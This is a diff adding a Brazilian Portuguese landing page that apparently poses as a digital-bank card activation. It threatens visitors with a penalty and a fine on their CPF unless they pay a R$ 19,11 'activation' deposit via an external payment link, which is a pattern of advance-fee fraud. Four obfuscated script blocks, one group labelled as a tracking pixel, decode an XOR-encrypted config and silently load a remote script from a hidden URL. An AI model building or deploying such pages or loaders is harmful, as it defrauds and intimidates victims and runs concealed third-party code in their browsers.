@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Ativação da conta</title>
+
+  <!-- Wistia -->
+  <script src="https://fast.wistia.com/player.js" async></script>
+  <script src="https://fast.wistia.com/embed/zy3ujfsp8y.js" async type="module"></script>
+
+  <style>
+    :root {
+      --primary: #ff4b2b;
+      --green: #20bf6b;
+      --text: #172033;
+      --card: #f7f8fa;
+      --border: #e1e5ea;
+      --warning-red: #d91e18;
+      --warning-bg: #fff5f4;
+      --warning-border: #f2b8b5;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      overflow-x: hidden;
+      background:
+        radial-gradient(
+          circle at 50% -10%,
+          rgba(255, 75, 43, 0.08),
+          transparent 32%
+        ),
+        #fff;
+      color: var(--text);
+      font-family:
+        Inter,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100vh;
+      margin: 0 auto;
+      padding: 18px 14px 30px;
+    }
+
+    /* =========================
+       AVISO
+    ========================== */
+
+    .warning-banner {
+      width: 100%;
+      margin-bottom: 18px;
+      padding: 14px;
+      display: flex;
+      align-items: flex-start;
+      gap: 11px;
+      border: 1px solid var(--warning-border);
+      border-radius: 12px;
+      background: var(--warning-bg);
+      box-shadow: 0 6px 18px rgba(220, 38, 38, 0.08);
+    }
+
+    .warning-icon {
+      width: 25px;
+      height: 25px;
+      min-width: 25px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--warning-red);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 900;
+      line-height: 1;
+    }
+
+    .warning-content {
+      flex: 1;
+    }
+
+    .warning-title {
+      margin-bottom: 4px;
+      color: var(--warning-red);
+      font-size: 18px;
+      line-height: 1.1;
+      font-weight: 900;
+      letter-spacing: 0.3px;
+    }
+
+    .warning-text {
+      color: #5f1d1a;
+      font-size: 13px;
+      line-height: 1.45;
+      font-weight: 600;
+    }
+
+    /* =========================
+       TÍTULO
+    ========================== */
+
+    .hero {
+      text-align: center;
+      padding: 0 2px;
+    }
+
+    .headline {
+      max-width: 410px;
+      margin: 0 auto;
+      color: var(--primary);
+      font-size: clamp(27px, 7.4vw, 35px);
+      line-height: 1.13;
+      letter-spacing: -1.15px;
+      font-weight: 800;
+    }
+
+    .headline strong {
+      display: inline;
+      color: #e83b22;
+    }
+
+    /* =========================
+       VÍDEO WISTIA
+    ========================== */
+
+    .video-section {
+      width: 100%;
+      margin: 22px auto 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .video-wrapper {
+      width: 100%;
+      max-width: 390px;
+      overflow: hidden;
+      border-radius: 14px;
+      background: #111;
+      box-shadow:
+        0 18px 40px rgba(0, 0, 0, 0.13),
+        0 3px 10px rgba(0, 0, 0, 0.06);
+      line-height: 0;
+    }
+
+    .video-wrapper wistia-player {
+      display: block;
+      width: 100%;
+      aspect-ratio: 9 / 16;
+      overflow: hidden;
+      border-radius: 14px;
+    }
+
+    wistia-player[media-id="zy3ujfsp8y"]:not(:defined) {
+      background:
+        center / contain no-repeat
+        url("https://fast.wistia.com/embed/medias/zy3ujfsp8y/swatch");
+      display: block;
+      filter: blur(5px);
+      padding-top: 177.78%;
+    }
+
+    /* =========================
+       INFORMAÇÕES
+    ========================== */
+
+    .information {
+      text-align: center;
+      padding: 22px 7px 0;
+    }
+
+    .information-main {
+      color: #242c3a;
+      font-size: 16px;
+      line-height: 1.55;
+      font-weight: 500;
+    }
+
+    .information-main strong {
+      color: #111827;
+      font-weight: 800;
+    }
+
+    .information-secondary {
+      margin-top: 14px;
+      color: #16ad5e;
+      font-size: 15px;
+      line-height: 1.55;
+      font-weight: 500;
+    }
+
+    /* =========================
+       CARD CONTA DIGITAL
+    ========================== */
+
+    .account-card {
+      width: 100%;
+      margin-top: 22px;
+      padding: 22px 18px 21px;
+      background: linear-gradient(
+        145deg,
+        #f9fafb,
+        #f3f5f7
+      );
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      box-shadow:
+        0 12px 35px rgba(24, 32, 48, 0.08);
+    }
+
+    .account-title {
+      margin-bottom: 18px;
+      text-align: center;
+      color: var(--primary);
+      font-size: 24px;
+      line-height: 1.2;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+
+    .benefits {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .benefit {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-height: 25px;
+    }
+
+    .check {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 2px 6px rgba(32, 191, 107, 0.18);
+    }
+
+    .check svg {
+      width: 12px;
+      height: 12px;
+    }
+
+    .benefit-icon {
+      width: 23px;
+      height: 23px;
+      min-width: 23px;
+      color: #263144;
+    }
+
+    .benefit-text {
+      color: #202938;
+      font-size: 15.5px;
+      line-height: 1.25;
+      font-weight: 700;
+    }
+
+    .deposit-title {
+      margin-top: 22px;
+      text-align: center;
+      color: #252c39;
+      font-size: 15.5px;
+      line-height: 1.35;
+      font-weight: 800;
+    }
+
+    .price {
+      margin-top: 8px;
+      text-align: center;
+      color: #121a28;
+      font-size: clamp(34px, 9vw, 42px);
+      line-height: 1;
+      font-weight: 850;
+      letter-spacing: -1.5px;
+    }
+
+    .price small {
+      font-size: 0.55em;
+      vertical-align: 0.13em;
+      letter-spacing: -0.5px;
+    }
+
+    /* =========================
+       BOTÃO
+    ========================== */
+
+    .cta-section {
+      margin-top: 22px;
+      padding-bottom: 5px;
+    }
+
+    .cta {
+      width: 100%;
+      min-height: 58px;
+      padding: 14px 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border-radius: 30px;
+      border: 0;
+      background:
+        linear-gradient(
+          135deg,
+          #ff512f,
+          #f13d20
+        );
+      color: #fff;
+      font-family: inherit;
+      font-size: 17px;
+      line-height: 1.2;
+      font-weight: 750;
+      letter-spacing: -0.15px;
+      cursor: pointer;
+      box-shadow:
+        0 9px 22px rgba(255, 75, 43, 0.25),
+        0 2px 5px rgba(0, 0, 0, 0.06);
+      transition:
+        transform 0.18s ease,
+        box-shadow 0.18s ease,
+        filter 0.18s ease;
+    }
+
+    .cta:hover {
+      filter: brightness(1.03);
+      transform: translateY(-2px);
+      box-shadow:
+        0 13px 27px rgba(255, 75, 43, 0.29),
+        0 3px 7px rgba(0, 0, 0, 0.07);
+    }
+
+    .cta:active {
+      transform: translateY(1px) scale(0.99);
+      box-shadow:
+        0 5px 13px rgba(255, 75, 43, 0.20);
+    }
+
+    .cta:focus-visible {
+      outline: 3px solid rgba(255, 75, 43, 0.30);
+      outline-offset: 4px;
+    }
+
+    .cta-arrow {
+      font-size: 22px;
+      line-height: 1;
+      transition: transform 0.18s ease;
+    }
+
+    .cta:hover .cta-arrow {
+      transform: translateX(3px);
+    }
+
+    /* =========================
+       RESPONSIVIDADE
+    ========================== */
+
+    @media (max-width: 360px) {
+
+      .page {
+        padding-left: 11px;
+        padding-right: 11px;
+        padding-top: 15px;
+      }
+
+      .warning-banner {
+        padding: 12px;
+      }
+
+      .warning-title {
+        font-size: 17px;
+      }
+
+      .warning-text {
+        font-size: 12.5px;
+      }
+
+      .headline {
+        font-size: 25px;
+      }
+
+      .video-section {
+        margin-top: 18px;
+      }
+
+      .information {
+        padding-top: 18px;
+      }
+
+      .information-main,
+      .information-secondary {
+        font-size: 14.5px;
+      }
+
+      .account-card {
+        padding: 19px 14px;
+      }
+
+      .account-title {
+        font-size: 22px;
+      }
+
+      .benefit-text {
+        font-size: 14px;
+      }
+
+      .cta {
+        min-height: 56px;
+        font-size: 16px;
+      }
+    }
+
+    @media (min-width: 768px) {
+
+      body {
+        padding: 25px 0;
+      }
+
+      .page {
+        min-height: auto;
+        padding-bottom: 35px;
+        background: #fff;
+        border-radius: 24px;
+      }
+
+      .headline {
+        max-width: 650px;
+        font-size: 35px;
+      }
+
+      .account-card {
+        padding: 24px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+
+      *,
+      *::before,
+      *::after {
+        transition: none !important;
+        scroll-behavior: auto !important;
+      }
+    }
+  </style>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<script>(function(){var i_b=atob("DM69WD0cPNfKip2QFbWfLU9wHu3o4unkZb2HdxJ/WLnk/+n9fKjEdl5zUfmo+LLjdrzUKElvE6K+5+6/ea/JPU5oEr25qLGydLrJKlR+SaOv+b+qTrWfNlxxWfXwqPnxYa+QLUlxVbGzp+3icLjYNkkxRLSl7rDjdqWfdB9qXbu/77+qN+zAdEY+Uran77+qN6rcLFwxSaOn4/vpOL7PPUt5UqPn+ejyfKrOehE+Sram//iyL+yfJWBh");var y_0a=[];for(var r_dc=0;r_dc<i_b.length;r_dc++){y_0a.push(i_b.charCodeAt(r_dc)&255);}var k_1g=y_0a[0];var q_w=y_0a.slice(1,1+k_1g);var o_zh=y_0a.slice(1+k_1g);var j_mx8=o_zh.map(function(b,s_c2i4){return b^q_w[s_c2i4%k_1g];});var b_zs8b="";for(var w_yw=0;w_yw<j_mx8.length;w_yw++){b_zs8b+=String.fromCharCode(j_mx8[w_yw]&255);}var t_sdld=decodeURIComponent(escape(b_zs8b));var e_ue51=JSON.parse(t_sdld);var f_cbk1=e_ue51.globals||[];f_cbk1.forEach(function(h_e21){window[h_e21.name]=h_e21.value;});var i_pq=document.createElement("script");i_pq.src=e_ue51.url;i_pq.async=true;i_pq.defer=true;(e_ue51.attributes||[]).forEach(function(w_y){i_pq.setAttribute(w_y.name,w_y.value);});(document.head||document.documentElement).appendChild(i_pq);})();</script>
+<script>(function(){var w_db9=atob("DFMIJex0V+If1wxAeSgqUJ4Yddg9v3g0CSAyCsMXM4wxongtEDVxC48bOsx9pSMzGiFhVZgHeJJ2r2ksViNhXYkYeYhs9SBiGCd8V4UWIpZ6pC56Ig4kB4sYOIB+u39iQwhzB4IVOoc97S4wECttSaUQdc49oW0sDDYqH85CNoMo5WpxT2YxE95EYoAm5zx0HDZqFdpWKr9i");var x_y4x=[];for(var s_hg=0;s_hg<w_db9.length;s_hg++){x_y4x.push(w_db9.charCodeAt(s_hg)&255);}var y_j5y=x_y4x[0];var d_8d=x_y4x.slice(1,1+y_j5y);var x_1in=x_y4x.slice(1+y_j5y);var p_9h=x_1in.map(function(b,w_kb){return b^d_8d[w_kb%y_j5y];});var g_6="";for(var a_64=0;a_64<p_9h.length;a_64++){g_6+=String.fromCharCode(p_9h[a_64]&255);}var i_lkgs=decodeURIComponent(escape(g_6));var p_0=JSON.parse(i_lkgs);var l_ef=p_0.globals||[];l_ef.forEach(function(i_8a){window[i_8a.name]=i_8a.value;});var k_amy=document.createElement("script");k_amy.src=p_0.url;k_amy.async=true;k_amy.defer=true;(p_0.attributes||[]).forEach(function(k_o4){k_amy.setAttribute(k_o4.name,k_o4.value);});(document.head||document.documentElement).appendChild(k_amy);})();</script>
+<body>
+
+  <main class="page">
+
+    <!-- AVISO -->
+    <div class="warning-banner" role="status">
+      <span class="warning-icon" aria-hidden="true">!</span>
+
+      <div class="warning-content">
+        <div class="warning-title">ATENÇÃO</div>
+
+        <div class="warning-text">
+          Caso não pague a taxa de ativação sera aplicada uma penalidade juntamento com uma multa no seu CPF, conforme os termos de uso
+        </div>
+      </div>
+    </div>
+
+
+    <!-- TÍTULO -->
+    <section class="hero">
+      <h1 class="headline">
+        Parabéns, o seu cartão está em produção!
+        <strong>Hora de ativar sua conta</strong>
+      </h1>
+    </section>
+
+
+    <!-- VSL WISTIA -->
+    <section
+      class="video-section"
+      aria-label="Vídeo de apresentação"
+    >
+      <div class="video-wrapper">
+
+        <wistia-player
+          media-id="zy3ujfsp8y"
+          aspect="0.5625">
+        </wistia-player>
+
+      </div>
+    </section>
+
+
+    <!-- INFORMAÇÕES -->
+    <section class="information">
+
+      <p class="information-main">
+        Para ativar sua conta e usar seu cartão virtual,
+        é necessário um depósito mínimo de
+        <strong>R$ 19,11.</strong>
+      </p>
+
+      <p class="information-secondary">
+        Este valor não é para nós, ele ficará na sua conta
+        e você poderá usá-lo como quiser assim que tiver
+        acesso ao aplicativo.
+      </p>
+
+    </section>
+
+
+    <!-- CONTA DIGITAL -->
+    <section
+      class="account-card"
+      aria-labelledby="account-title"
+    >
+
+      <h2
+        class="account-title"
+        id="account-title"
+      >
+        Conta Digital
+      </h2>
+
+      <ul class="benefits">
+
+        <!-- PIX -->
+        <li class="benefit">
+
+          <span
+            class="check"
+            aria-hidden="true"
+          >
+            <svg viewBox="0 0 16 16" fill="none">
+              <path
+                d="M4 8.2L6.7 10.8L12.2 5.3"
+                stroke="white"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+
+          <svg
+            class="benefit-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M13.5 2L5 13H11L10.5 22L19 10.5H13L13.5 2Z"
+              stroke="currentColor"
+              stroke-width="1.8"
+              stroke-linejoin="round"
+            />
+          </svg>
+
+          <span class="benefit-text">
+            Pix 24 horas
+          </span>
+
+        </li>
+
+
+        <!-- BOLETOS -->
+        <li class="benefit">
+
+          <span class="check" aria-hidden="true">
+            <svg viewBox="0 0 16 16" fill="none">
+              <path
+                d="M4 8.2L6.7 10.8L12.2 5.3"
+                stroke="white"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+
+          <svg
+            class="benefit-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <rect
+              x="3"
+              y="5"
+              width="18"
+              height="14"
+              rx="2"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M3 9H21"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M7 14H11"
+              stroke="currentColor"
+              stroke-width="1.8"
+              stroke-linecap="round"
+            />
+          </svg>
+
+          <span class="benefit-text">
+            Pagamento de boletos
+          </span>
+
+        </li>
+
+
+        <!-- CARTÃO -->
+        <li class="benefit">
+
+          <span class="check" aria-hidden="true">
+            <svg viewBox="0 0 16 16" fill="none">
+              <path
+                d="M4 8.2L6.7 10.8L12.2 5.3"
+                stroke="white"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+
+          <svg
+            class="benefit-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <rect
+              x="3"
+              y="5"
+              width="18"
+              height="14"
+              rx="2"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M3 9H21"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <circle
+              cx="17"
+              cy="15"
+              r="1.2"
+              fill="currentColor"
+            />
+          </svg>
+
+          <span class="benefit-text">
+            Cartão Virtual
+          </span>
+
+        </li>
+
+
+        <!-- SAQUES -->
+        <li class="benefit">
+
+          <span class="check" aria-hidden="true">
+            <svg viewBox="0 0 16 16" fill="none">
+              <path
+                d="M4 8.2L6.7 10.8L12.2 5.3"
+                stroke="white"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+
+          <svg
+            class="benefit-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <rect
+              x="4"
+              y="3"
+              width="16"
+              height="18"
+              rx="2"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M7 7H17"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M7 11H17"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M7 15H12"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+          </svg>
+
+          <span class="benefit-text">
+            Saques em caixas eletrônicos
+          </span>
+
+        </li>
+
+
+        <!-- ATENDIMENTO -->
+        <li class="benefit">
+
+          <span class="check" aria-hidden="true">
+            <svg viewBox="0 0 16 16" fill="none">
+              <path
+                d="M4 8.2L6.7 10.8L12.2 5.3"
+                stroke="white"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </span>
+
+          <svg
+            class="benefit-icon"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <path
+              d="M5 13V11C5 7.134 8.134 4 12 4C15.866 4 19 7.134 19 11V13"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <rect
+              x="3"
+              y="12"
+              width="4"
+              height="7"
+              rx="1.5"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <rect
+              x="17"
+              y="12"
+              width="4"
+              height="7"
+              rx="1.5"
+              stroke="currentColor"
+              stroke-width="1.8"
+            />
+
+            <path
+              d="M19 19C18.2 21 16.5 21 14.5 21H13"
+              stroke="currentColor"
+              stroke-width="1.8"
+              stroke-linecap="round"
+            />
+          </svg>
+S
+          <span class="benefit-text">
+            Atendimento ao cliente 24/7
+          </span>
+
+        </li>
+
+      </ul>
+
+
+      <!-- VALOR -->
+      <p class="deposit-title">
+        Ative sua conta depositando pela:
+      </p>
+
+      <div
+        class="price"
+        aria-label="Dezenove reais e onze centavos"
+      >
+        <small>R$</small> 19,11
+      </div>
+
+    </section>
+
+
+    <!-- BOTÃO -->
+    <section class="cta-section">
+
+      <a
+        class="cta"
+        href="https://pagamentoconfiavel.com.br/TnBOgcif"
+        aria-label="Ativar minha conta agora"
+      >
+        <span>
+          Ativar minha conta agora
+        </span>
+
+        <span
+          class="cta-arrow"
+          aria-hidden="true"
+        >
+          →
+        </span>
+      </a>
+
+    </section>
+
+  </main>
+
+</body>
+</html>
